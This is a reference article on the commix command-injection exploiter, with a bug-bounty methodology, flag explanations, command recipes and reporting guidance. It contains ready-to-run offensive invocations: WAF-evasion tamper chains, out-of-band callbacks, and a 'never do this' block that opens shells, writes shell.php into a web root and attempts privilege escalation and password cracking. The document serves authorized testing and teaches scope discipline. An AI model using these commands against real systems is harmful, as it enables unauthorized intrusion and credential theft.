---
name: "commix"
categories:
  - blackarch-webapp
version: "2470.6aedd1f4"
homepage: "https://github.com/commixproject/commix"
packaged-by: [blackarch, kali, aur, nixpkgs]
blackarch-builddate: "2026-09-13"
build-system: scripts
license: custom:unknown, AGPL
meta-checked: "2026-11-09"
github-repo: "commixproject/commix"
github-stars: 5897
github-pushed: "2026-11-07"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 332
gh-activity-checked: "2026-11-09"
---

# commix

> Automated detection and exploitation of OS command (and code) injection vulnerabilities.

## What it's for

Commix (command injection exploiter), by Anastasios Stasinopoulos / CommixProject, is the reference open-source tool for command injection. Given an injectable parameter it tries four techniques — results-based (direct output), boolean-based (yes/no inference), time-based (delay inference) and file-based — over GET/POST parameters, headers, cookies, JSON/XML/GraphQL bodies, or inputs harvested from crawls, forms, sitemaps, OpenAPI descriptions, proxy logs, bulk files and raw request files. Once injection is proven it escalates: pseudo OS-shell, reverse/bind shells upgradeable to a full PTY, file transfer, Windows registry access, and enumeration through to password hashes with a built-in dictionary attack. Tamper scripts shuffle payloads for filter/WAF evasion, `--oob` proves execution out-of-band when nothing reflects, `--eval` switches to code-injection mode for PHP/Python/Ruby/JavaScript/PowerShell/Perl/Lua targets. Sessions are resumable and output can be JSON/CSV/HAR.

## Typical use cases

### Test a parameter and drop into a shell

The canonical single-target run against a GET parameter.

```
commix --url="http://target.example.com/ping.php?addr=198.51.100.10" --os-shell
```

Outcome: fingerprints the parameter's injectability across techniques; on success opens an interactive pseudo OS-shell on the target whose commands' output prints inline. Without `--os-shell` the run just reports the finding.

### Confirm blind injection out-of-band

Prove execution when the response reflects nothing.

```
commix --url="http://target.example.com/api/lookup" --data="addr=198.51.100.10" --oob
```

Outcome: fires payloads whose command output is carried back over HTTP(S) or DNS to an interaction server (public `oast.fun` by default — point `--oob-server` at a self-hosted instance to keep callbacks in-house), and reports captured interactions as proof of execution.

### Batch-scan targets unattended

Point it at a list of URLs and collect machine-readable results.

```
commix -m targets.txt --batch --report-json=results.json
```

Outcome: walks every URL in `targets.txt` without pausing for prompts (`--batch` answers defaults), and writes findings per target to `results.json` for triage — the standard shape for scheduled or CI-driven runs.

### Tune technique and evade filters

Restrict to a technique and chain tamper scripts.

```
commix --url="http://target.example.com/ping.php?addr=198.51.100.10" --technique=T --tamper=space2ifs.py
```

Outcome: limits testing to time-based payloads (`--technique` accepts combinations of R/B/T/F — results-based, boolean-based, time-based, file-based) while the tamper script rewrites payload syntax, letting injection land through input filters that block default separators.

---

## Bug bounty workflow with commix

commix is to OS command injection what [[sqlmap]] is to SQL injection: the
reference automated exploiter, and the same discipline applies. Left to its
defaults it sweeps four techniques across every parameter, escalates to an
interactive shell on demand, and can write files, dump password hashes, and
upgrade to a PTY. On an authorized program that restraint is the line between a
paid Critical and a ban for "automated scanning / out-of-scope impact." The
critical scope distinction: **commix proves OS command (and code) injection —
execution on the host; [[sqlmap]] proves SQL injection — execution in the
database.** They are siblings, not substitutes. A parameter can be vulnerable to
one, both, or neither; run the right tool for the sink you suspect, and never
assume a command-injection finding implies DB access or vice versa.

Everything below is single-target, low-volume, and evidence-first. Work the
phases in order on a fresh finding; never skip Phase 0. The authorization,
capture, rate, and stop-line discipline is shared with [[sqlmap]] — read that
article's workflow alongside this one.

### Phase 0 — Authorization and scope gate (before the first request)

Answer four questions *in writing to yourself* before you type `commix`:

- **Is command injection / RCE testing in scope, and is automated tooling
  allowed?** commix is an automated scanner that achieves code execution. Many
  programs forbid automated scanners or cap request rate; some accept SQLi but
  treat RCE as out of scope or as requiring a separate, pre-cleared window.
  Confirm RCE is explicitly in scope — a proven command-injection bug is a
  higher-impact (and higher-blast-radius) event than most SQLi.
- **What is the execution ceiling?** Most programs want *proof of execution*, not
  a foothold. "Run one benign, read-only command" (`id`, `whoami`, `hostname`,
  `uname -a`) is the norm. Plan to stop at a single `--os-cmd` and never open
  `--os-shell`.
- **Is state change / interactive access permitted?** `--os-shell`, `--pty`,
  reverse/bind shells, `--file-write`/`--file-dest`, `--priv-esc`,
  `--passwords`, and the Windows registry writes (`--reg-add`/`--reg-del`) all
  establish a foothold or modify the target. Assume **no** unless the rules of
  engagement say yes in words.
- **What is the rate limit?** Translate it into `--delay` and `--timeout`.
  commix defaults to `--threads 1` (max 10, `-o` is shorthand for
  `--threads=3`) — leave threads at 1 for bounty work. Time-based and file-based
  techniques are slow by nature; budget for it rather than parallelizing.

### Phase 1 — Capture, don't guess

The reliable entry point is a real request, not a hand-typed URL — identical to
the [[sqlmap]] `-r` workflow. Proxy the target through Burp/ZAP, exercise the
suspicious feature as the authenticated user, *Copy to file* (save the raw
request), and feed it with `-r`:

```
commix -r lookup.req --batch --technique=b --level 1
```

`-r` preserves the method, every header, the exact cookie jar, the
`Content-Type`, and the body byte-for-byte, so you test the endpoint as the
application sees it — including CSRF tokens and auth headers a `-u` URL would
drop. Pin the suspected parameter with the injection mark `*` inside the file
(e.g. `addr=198.51.100.10*` or `{"host":"*"}`) so commix attacks that one spot
instead of sweeping every parameter. Hand the same `.req` file to the triager —
it is the single most reproducible artifact you can submit.

commix also ingests other capture shapes: `-l` reads a Burp/WebScarab **proxy
log**, `-t` replays a saved **traffic file**, `--har` reads a **HAR** export,
and `-m` walks a **bulk file** of URLs. For anti-CSRF forms, let commix refresh
the token each request with `--csrf-token=<field>` and `--csrf-url=<url>`
(`--csrf-method`, `--csrf-data` tune the refresh request) rather than fighting
403s.

### Phase 2 — Low-and-slow detection

The first pass is deliberately conservative. Constrain technique, level, and
rate:

```
commix -r lookup.req -p addr \
  --technique=b \
  --level 1 --time-sec 1 \
  --delay 1 --timeout 30 --retries 3 \
  --batch
```

- `--level 1` (default; range 1-3) tests URL parameters and POST data only —
  the floor, and where you start. See the ladder in Phase 3.
- `--technique=b` runs *only* boolean-based blind on the first pass. commix's
  default is `rbtf` (all four families); narrowing to one at a time keeps
  request volume and noise down and makes each positive attributable to a
  specific family. There is **no `--risk` flag** in commix — unlike [[sqlmap]],
  aggressiveness is governed by *which techniques* you enable (`--technique`),
  the `--level` placement sweep, and `--time-sec`, not a separate risk dial.
- `--delay 1` spaces requests; `--timeout 30` (default) and `--retries 3`
  (default) are the connection-failure controls. Keep `--delay` up and threads
  at 1 on production.
- Add `--os linux` / `--os windows` once you know the target OS to stop commix
  probing both families of separators and payloads.

Run the in-band family first (`--technique=r`), then boolean (`b`), and only
reach for time-based (`t`) and file-based (`f`) when the faster families find
nothing — those two are slower and, for time-based, the most false-positive
prone (see Phase 4).

### Phase 3 — The level escalation ladder

Escalate only when a lower rung finds nothing and you still have reason to
believe the parameter is injectable. Each rung widens *where* commix looks, which
means more requests against more of the request surface.

| Rung | Setting | What it adds | When to climb |
|---|---|---|---|
| 1 | `--level 1` (default) | URL parameters + POST data | always start here |
| 2 | `--level 2` | + `Cookie` header values | parameters clean, but session cookies look dynamic/reflected |
| 3 | `--level 3` | + HTTP headers (`User-Agent`, `Referer`, etc.) | app logs or echoes UA/Referer into a shell-reachable sink |

commix has no `--level 4/5` — the range is 1-3. For a single known header you can
skip the sweep entirely and mark the value directly: put `*` after the header
value in the `-r` file or in `-H`/`--headers`, exactly as you would mark a body
parameter. That is lower-volume than climbing to `--level 3`, which tests *every*
header. Pair level climbing with `--technique` narrowing so you are never
multiplying "all placements × all techniques" at once.

### Phase 4 — Confirm per technique family (evidence standard)

Once commix reports an injection, the goal flips from *finding* to *proving*. The
evidence you must capture differs by family — state which applies and show it.
commix's four techniques (verbatim from the project's Techniques page):

| Technique | `--technique` | How it proves execution | Evidence to capture |
|---|---|---|---|
| Results-based classic | `r` | Command output is reflected **directly** in the HTTP response | The response body showing your command's output (e.g. `id` → `uid=33(www-data)...`) against the clean baseline |
| Boolean-based blind | `b` | True/false inference from a content difference | The True vs False differential; anchor it with `--string`/`--not-string` (and `--regexp`/`--code`) so the oracle is one *you* verified, not a heuristic |
| Time-based blind | `t` | Inference from an injected delay | A **repeatable** delay-vs-baseline measurement across rising `--time-sec` (e.g. 1, 3, 5) — the response time must track the delay you injected |
| File-based blind | `f` | Output is written to a file under the web root, then fetched over HTTP | The retrievable file (via its URL) containing your command output; note the `--web-root`/`--tmp-path` used |

Guidance per family:

- **Results-based (`r`)** is the strongest and cleanest — the output is right
  there in the response. This is your preferred proof whenever the sink
  reflects. Capture the request/response pair.
- **Boolean-based (`b`)** is the direct analog of [[sqlmap]]'s boolean oracle.
  Pages that barely change between true and false produce false positives; kill
  them before reporting by anchoring with `--string="<text only on true>"` or
  `--not-string="<text only on false>"`.
- **Time-based (`t`)** carries the same high false-positive risk as its SQLi
  cousin: a congested network or a slow endpoint fakes the delay. Never report a
  time-based-only finding without showing the delay tracks `--time-sec` across at
  least two or three rising values. `--time-sec` defaults to 0 and sets the
  seconds the injected OS command sleeps.
- **File-based (`f`)** needs a writable directory that is also *reachable by
  URL*. commix writes command output to a temp file there and fetches it back;
  if the web root is not browsable, this family silently fails even when the
  parameter is injectable. Note that it leaves a file on disk — see the stop
  line.

**Minimal-impact confirmation command** — one benign, read-only command is the
whole proof for OS command injection:

```
commix -r lookup.req -p addr --technique=r --os-cmd="id" --batch
```

Expected: the response (or commix's output block) carries `uid=…`. On Windows,
use `--os-cmd="whoami"`. The low-impact enumeration switches — `--current-user`,
`--hostname`, `--is-root`, `--is-admin`, `--sys-info` — each run a single
built-in read-only command through the injection and are acceptable proof
amplifiers; `--ps-version` reports the PowerShell version on Windows targets.
They establish context (who, where, privilege level) without writing anything.

### Phase 5 — Blind confirmation out-of-band (OAST/DNS)

When nothing reflects and boolean/time signals are ambiguous, prove execution
out-of-band. commix carries the command output back over an interaction server
rather than the HTTP response:

```
commix -r lookup.req -p addr --oob --batch
commix -r lookup.req -p addr --oob --oob-transport=dns --batch
```

- `--oob` tests over an out-of-band (OAST) channel — HTTP(S) or DNS. By default
  it uses the public `oast.fun` interactsh server.
- `--oob-transport` selects the client the *target* uses to reach the server
  (e.g. `dns`, `curl`); `--oob-transport=dns` is the DNS-exfiltration path for
  hosts that cannot make outbound HTTP but can resolve names. (There is **no
  `--dns-domain`/`--dns-server` flag** — DNS OOB is driven entirely through
  `--oob-transport`.)
- `--oob-scheme` picks `http` or `https` for the HTTP transport.
- `--oob-server` points at a **self-hosted** interactsh instance (with
  `--oob-token` for its auth token) — the privacy-preserving choice, since the
  default public server means your interaction data (and the target's hostname)
  transits a third party. For any real engagement, self-host.
- `--oob-poll` (seconds between polls of the server) and `--oob-timeout`
  (seconds to wait for an interaction) tune how long commix waits for the
  callback; raise `--oob-timeout` on slow or heavily-firewalled targets before
  concluding "no interaction."

A captured interaction at your OAST server is unambiguous proof of execution
with zero reflection — the class of finding most scanners miss, and the lowest
dupe risk.

### Phase 6 — The stop line (what NOT to run)

On a standard web bug bounty your job ends at a single demonstrated command. The
following cross from "proof" into "intrusion / foothold" and are rejected or
punished by most programs unless the RoE authorizes them in words:

- **`--os-shell`** — drops you into an interactive pseudo-shell on the target.
  This is a foothold, not a proof. When commix prints the interactive
  `commix(os_shell) >` prompt, that is the stop line: you have already proven
  execution; do not pivot. Report the capability in prose.
- **`--pty`** and reverse/bind shells — upgrade to a full interactive PTY
  session. Foothold establishment; out of scope by default.
- **`--file-write` / `--file-dest`** — plant a file on the target; destructive
  and almost never in scope. (Note the **file-based technique `f` itself writes
  a temp file** to prove the bug — prefer results-based `r` or `--oob` on
  programs sensitive to any write, and clean up any artifact `f` leaves.)
- **`--priv-esc`** — attempts privilege escalation on the host. Intrusion.
- **`--passwords`** — reads and runs a built-in dictionary attack against host
  password hashes. Recovering context is one thing; cracking credentials is a
  separate, usually forbidden act (the same line [[sqlmap]]'s `--passwords`
  crosses).
- **Windows registry writes** — `--reg-add` / `--reg-del` modify the registry;
  `--reg-read` is read-only but still host enumeration beyond a single proof.
- **`--msf-path` / Metasploit handoff** and any destructive `--os-cmd`
  (anything that writes, deletes, installs, or reaches further into the
  network).

If the injection is clearly shell-capable or runs as root/SYSTEM
(`--is-root`/`--is-admin` returned true), that is a **severity argument you make
in prose in the report** — not a shell you open to prove it.

### Phase 7 — Report

Capture the evidence (see *Reporting evidence*), write impact-first, attach the
`.req` file and the exact command, and submit.

## Where the money is with commix

| Priority | Finding class | commix feature / command that reaches it | Typical severity | Dupe / FP risk |
|---|---|---|---|---|
| 1 | Results-based OS command injection on an unauthenticated parameter | `--technique=r`, confirmed by reflected command output | Critical | **High** — scanners find reflective RCE fast |
| 2 | Authenticated command injection reachable only with a valid session | `-r authed.req` with live `--cookie`/headers | Critical | Lower — needs the captured session |
| 3 | Code injection (eval sink) in PHP/Python/Ruby/JS/Perl/etc. | `--eval=<lang>` | Critical | Medium |
| 4 | Boolean-based blind command injection | `--technique=b` + `--string`/`--not-string` anchor | High | Medium |
| 5 | OOB-confirmed blind injection (no reflection) | `--oob` (HTTP or `--oob-transport=dns`) | High | **Low** — most scanners can't model OAST |
| 6 | Time-based blind command injection | `--technique=t`, confirm with rising `--time-sec` | High | Medium dupe, **high FP** |
| 7 | File-based blind injection | `--technique=f` with a URL-reachable web root | High | Low–Medium |
| 8 | Injection in an HTTP header or cookie | `--level 2`/`3`, or mark the value with `*` | High–Medium | Low — placement sweeps are off by default |
| 9 | Shellshock (CVE-2014-6271) in a CGI/env sink | `--module=shellshock` | High | Low (legacy, but still live on old kit) |
| 10 | WAF-masked injection recovered via tampering | `--tamper=…` chain + `--random-agent` | High | **Low** — the WAF hides it from most hunters |

The pattern mirrors [[sqlmap]]: **reflective in-band bugs pay the most but dupe
fastest**; your edge is the classes scanners miss — OOB-confirmed blind,
header/cookie-placement, code-injection (`--eval`) sinks, and WAF-masked
injections recovered with `--tamper`. Those are where `-r`, placement marks,
`--oob`, and tampering earn their keep.

## Command recipes

Each block is a real invocation with the low-volume settings called out and the
output you should expect.

### Conservative confirmation of one parameter

```
commix -r lookup.req -p addr \
  --technique=r --level 1 \
  --delay 1 --batch --flush-session
```

Expected: for a reflective sink, commix prints a confirmation block naming the
injectable parameter, the technique, the payload, and the suffix/prefix, then
(because `--technique=r`) echoes a test command's output. `--flush-session`
forces a clean run (ignores cached results from `-s`/the session file) so what
you capture is reproducible from scratch — important for the report. Copy the
confirmation block verbatim; it is your core evidence. Add `--proof` to have
commix print an explicit proof-of-concept command execution alongside the
finding.

### Anchor a blind boolean oracle

```
commix -r search.req -p q --technique=b \
  --string="Server is up" \
  --delay 1 --batch
```

`--string` names text present only when the injected condition is **True**;
`--not-string` names text present only when it is False; `--regexp` matches a
pattern and `--code` keys on a specific HTTP status. This replaces commix's
heuristic page-diffing with a marker you verified by hand — the cure for pages
that barely change, and the way you kill boolean false positives before
reporting. Same technique, same purpose as [[sqlmap]]'s `--string`/`--not-string`.

### Prove time-based repeatably (kill the false positive)

```
commix -r lookup.req -p addr --technique=t --time-sec 3 --delay 1 --batch
commix -r lookup.req -p addr --technique=t --time-sec 7 --delay 1 --batch
```

Expected: the measured response time rises with `--time-sec` (≈3s, then ≈7s). An
injected delay that tracks the value you set — not a one-off slow response — is
the evidence. A single unconfirmed time-based hit is the classic rejected report.

### Confirm blind out-of-band (self-hosted server)

```
commix -r lookup.req -p addr --oob \
  --oob-server="https://oast.example.com" --oob-token="$OOB_TOKEN" \
  --oob-timeout 30 --batch
# DNS-only egress:
commix -r lookup.req -p addr --oob --oob-transport=dns \
  --oob-server="https://oast.example.com" --oob-token="$OOB_TOKEN" --batch
```

Expected: an interaction recorded at your interactsh server, proving the target
executed your command and reached out. Self-hosting (`--oob-server`) keeps the
target's hostname and your interaction data off the public `oast.fun` default.

### Single benign command as the whole proof

```
commix -r lookup.req -p addr --os-cmd="id" --batch          # Linux
commix -r lookup.req -p addr --os-cmd="whoami" --batch      # Windows
commix -r lookup.req -p addr --current-user --hostname --is-root --batch
```

Expected: `uid=33(www-data) gid=33(www-data) …`, a username, a hostname, and a
privilege verdict. That triplet is a complete, minimal-impact RCE proof — stop
here. Do **not** follow it with `--os-shell`.

### Code-injection (eval) sink

```
commix -r render.req -p template --eval=php --os-cmd="id" --batch
```

Expected: where the parameter reaches a language `eval()`/`exec()` rather than a
shell, `--eval=<lang>` switches commix into code-injection mode (PHP, Python,
Ruby, JavaScript, PowerShell, Perl, Lua). A bare `--eval` tests all supported
languages; name the one you suspect to cut volume.

### WAF present: skip the probe, tamper, randomize

```
commix -r search.req -p q --batch --list-tampers     # see the catalogue
commix -r search.req -p q --batch \
  --tamper=space2ifs,randomcase \
  --skip-waf --random-agent \
  --technique=b --delay 1
```

`--list-tampers` prints the available tamper scripts (e.g. `space2ifs`,
`space2htab`, `uninitializedvariable`, `dashlesstest`, `printfoctal`,
`ansiquote`, `randomcase`). `--tamper` reshapes each payload before it is sent
and takes a comma-separated chain — build it simplest-first, mirroring the
[[sqlmap]] tamper discipline. `--skip-waf` *skips commix's heuristic WAF/IPS
detection* (it does not bypass a WAF — tampering does that; skip the probe only
to cut its noise). `--random-agent` rotates the User-Agent some basic filters
key on. Encoding controls — `--param-encoding`, `--skip-urlencode`,
`--skip-xmlencode`, and `--param-del`/`--cookie-del` — reshape how payloads are
serialized when a filter or parser mangles the defaults. Tampering does not
reduce request count; keep `--delay` up and threads at 1, and back off the
moment 403/429 patterns change.

### Route everything through your proxy (evidence + kill switch)

```
commix -r lookup.req -p addr --batch --proxy="http://127.0.0.1:8080" --technique=r
```

Routing through Burp gives a complete, reviewable request/response log to attach
to the report, and a kill switch (drop the proxy to stop traffic instantly) —
the same control move as with [[sqlmap]].

### Never do this on a bounty program

```
# DANGER — do NOT run on a bounty program:
commix -m targets.txt --batch --all                 # bulk file, full enumeration, no prompts
commix -r lookup.req --os-shell --batch             # interactive foothold
commix -r lookup.req --file-write shell.php --file-dest /var/www/html/shell.php --batch
commix -r lookup.req --priv-esc --passwords --batch # escalation + credential attack
```

`-m` (bulk file) with `--batch` auto-attacks every host it reads — a scope
violation the moment one host is out of program, indistinguishable from mass
exploitation. `--batch` is for *one* authorized target at a time. The other
three cross the stop line (foothold, file plant, escalation/credential attack).

## Pitfalls, noise and scope discipline

How hunters get reports rejected — or get banned — with commix, and the settings
that prevent it. The discipline is shared with [[sqlmap]]; the differences are
noted.

- **Running defaults on production.** Default commix tries all four techniques
  (`rbtf`) against every parameter and, with enumeration flags, runs multiple OS
  commands. Scope it: `-p <param>`, `--technique=<one family>`, `--os <known>`,
  `--delay`, threads at 1. Confirm one parameter with one benign command, then
  stop.
- **Opening a shell to "show impact."** `--os-shell`/`--pty`/reverse shells
  modify nothing by themselves but establish interactive access that routinely
  exceeds scope even on programs that accept RCE. One `--os-cmd="id"` is the
  proof; argue further impact in prose. This is the single most common
  over-reach with commix.
- **Writing files as "proof."** `--file-write`/`--file-dest` plant artifacts;
  even the file-based technique (`f`) writes a temp file to function. On
  write-sensitive programs, prefer `--technique=r` or `--oob`, and clean up
  anything `f` leaves behind. Report any artifact you created and its path.
- **Time-based false positives.** A congested network fakes the delay signal.
  Re-run with rising `--time-sec` (1, 3, 7) and show the response time tracks the
  injected delay. An unconfirmed time-based bug is the classic rejected commix
  report — identical failure mode to [[sqlmap]]'s time-based blind.
- **File-based silent failure.** `--technique=f` needs a web root that is both
  writable and URL-reachable; when it is not, the family fails even though the
  parameter is injectable, and you wrongly conclude "not vulnerable." Confirm
  with `r`, `b`, `t`, or `--oob` before ruling a parameter out.
- **OOB data to a third party.** The default `--oob` server is the public
  `oast.fun`. On a real target that leaks the host's name and your interaction
  data off-site — self-host with `--oob-server`/`--oob-token`.
- **Credential and escalation creep.** `--passwords` cracks hashes and
  `--priv-esc` escalates — both are separate acts beyond proving injection, and
  both are usually out of scope. Recover context (`--current-user`, `--is-root`)
  only.
- **Mass scanning via `-m --batch`.** Reaches hosts you were never authorized to
  touch — the commix equivalent of [[sqlmap]]'s `-g`/`-m` misuse.
- **Ignoring the rate limit / WAF ban.** Threads up and no delay trips rate
  limits and WAF blocks, poisoning the endpoint for the rest of your test and
  flagging your IP. `--delay`, threads at 1, `--random-agent`, and a minimal
  `--tamper` chain keep you under the radar; back off the moment 429/403 patterns
  change.
- **Testing without a real request.** A hand-typed `-u` URL drops the cookies,
  CSRF token, and headers the vulnerable code path needs, producing false
  negatives. Capture with a proxy and use `-r`, `-l`, `-t`, or `--har`.
- **Confusing the tool for the sink.** commix proves OS command / code
  injection, not SQL injection. If the sink is a database query, this is the
  wrong tool — reach for [[sqlmap]]. Running commix against a pure SQLi
  parameter wastes requests and finds nothing.

## Reporting evidence

The report is the deliverable. A triager must be able to reproduce the finding
from what you submit, without guessing. Capture and include:

- **The exact command**, verbatim, including every flag (`-r`, `-p`,
  `--technique`, `--level`, `--os`, `--time-sec`, `--oob*`). The flags *are* the
  methodology.
- **The captured request file** (`.req`) you fed to `-r`, with
  credentials/session tokens redacted but structure intact — the most
  reproducible artifact, and the thing to hand the triager.
- **commix's injection confirmation block** verbatim: the injectable
  **parameter**, the **technique** (results-based / boolean-based blind /
  time-based blind / file-based blind / `--eval` code injection / shellshock),
  the **payload**, and any prefix/suffix. The technique names the evidence class;
  the payload lets them replay it by hand. `--proof` makes commix emit an
  explicit PoC line.
- **Evidence standard by technique** — state which applies and show it:
  - *Results-based (`r`)*: the response body carrying your command's output
    against the clean baseline.
  - *Boolean-based (`b`)*: the True/False differential, anchored with
    `--string`/`--not-string`/`--regexp`/`--code`.
  - *Time-based (`t`)*: the repeatable response-time-vs-baseline measurement
    across rising `--time-sec`.
  - *File-based (`f`)*: the URL-retrievable file containing your output (and the
    `--web-root`/`--tmp-path` used).
  - *OOB*: the interaction recorded at your OAST server (self-hosted).
- **The benign proof command and its output**: a single `--os-cmd="id"` (or
  `whoami`) plus `--current-user`/`--hostname`/`--is-root` output shows execution
  and privilege context without touching application data or opening a shell.
  State explicitly that you limited execution to read-only commands on purpose.
- **A matching request/response pair** from your proxy (run with
  `--proxy=http://127.0.0.1:8080`) showing the payload going out and the
  output/differential/timing/interaction coming back — the raw evidence behind
  commix's verdict.
- **The session/output artifacts**: commix writes to its per-target output
  directory (`--output-dir` overrides the location) and can emit machine-readable
  results with `--report-json=<file>` and `--results-file=<file>`. Attach the
  relevant excerpt.
- **Cleanup statement**: if the file-based technique or any write ran, name every
  file created and its path, and confirm removal.

Write the title impact-first — "Unauthenticated OS command injection in
`GET /ping?addr=` executes arbitrary commands as `www-data` on the application
host" — state preconditions, give the copy-pasteable command and `.req`, show
the benign command's output as proof, and close with a remediation paragraph
(never pass user input to a shell; use argument-vector APIs that bypass the
shell, e.g. `subprocess.run([...], shell=False)` / `execve`; allowlist where a
value must reach a command; for code sinks, eliminate `eval`/`exec` on user
input). Map severity to the program's rubric and cite the OS, the user the
command ran as, and whether it was root/SYSTEM.

## References

- commix — repository and README: https://github.com/commixproject/commix
- commix wiki — Usage (full option reference): https://github.com/commixproject/commix/wiki/Usage
- commix wiki — Techniques (the four families and their examples): https://github.com/commixproject/commix/wiki/Techniques
- commix wiki — Filters bypass examples (tamper scripts): https://github.com/commixproject/commix/wiki/Filters-bypass-examples
- commix source — command-line option definitions (`src/core/parse/cmdline.py`, flags/defaults verified): https://github.com/commixproject/commix/blob/master/src/core/parse/cmdline.py
- OWASP — Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Companion in this vault: [[sqlmap]] — the SQL-injection sibling; shared capture, rate, stop-line, and reporting discipline.

*Research supplement added 2026-11-15, grounded in the commix Usage, Techniques, and Filters-bypass-examples wikis, the project README, and the packaged `src/core/parse/cmdline.py` option source (flag names and defaults verified against it — note commix has no `--risk` or `--dns-domain`/`--dns-server` flags), cross-linked to the [[sqlmap]] methodology, and OWASP's command-injection reference (model: claude-opus-4-8).*
